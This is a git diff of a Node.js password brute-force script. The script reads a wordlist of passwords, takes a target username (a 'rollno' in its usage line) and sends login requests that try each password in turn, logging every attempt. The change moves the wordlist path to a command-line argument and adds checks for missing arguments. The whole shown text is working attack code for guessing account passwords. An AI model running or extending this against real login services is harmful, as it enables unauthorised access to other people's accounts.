@@ -4,6 +4,9 @@ var request = require('request');
 //node fs module to read from or write to file
 var fs = require('fs');
 
+//converts relative path to full path
+var resolve = require('path').resolve
+
 //passwords array which will contain passwords from .txt file
 var passwords = [];
 
@@ -14,20 +17,29 @@ var parseString = require('xml2js').parseString;
 //username supplied by user as command line argument
 var targetUsername = process.argv[2];
 
-/**
-* I am using passwords_jhon.txt for brute force attack which 
-* contains 3107 passords 
-* You can use other files e.g. pass500.txt (top 500 passwords)
-*/
+//wordlist is taken through the commandline
+var wordlistPath = process.argv[3];
+
+//raises error if either of the arguments are missing
+if(!wordlistPath || !targetUsername) {
+    console.log("Usage: node main.js <rollno> <wordlist>")
+    return -1
+}
+
+//checks for the existance of wordlist in the specified location
+if (!fs.existsSync(wordlistPath)) {
+    console.log("Wordist file doesn't exist here : " + resolve(wordlistPath))
+    return -2
+}
+
 var lineReader = require('readline').createInterface({
-	//change this line if using other passwords list
-    input: fs.createReadStream('./passwords_jhon.txt')
+    input: fs.createReadStream(wordlistPath)
 });
 
 lineReader.on('line', function(line) {
     passwords.push(line);
 }).on('close', function() {
-    // This method will be executed after reading the whole file.
+    // This method will be executed after reading the complete file.
     bruteForce();
 });
 
@@ -43,7 +55,7 @@ var makeRequest = function(testCase) {
     	body: testCase.body
     	//json: testCase.params
     }, function optionalcallback(error, response, body) {
-    	console.log('testing: ' + testCase.params.username, 
+    	console.log('Testing: ' + testCase.params.username, 
     		    'using password: ' + testCase.params.password);
 	    if (error) {
 	        console.log('err', error);
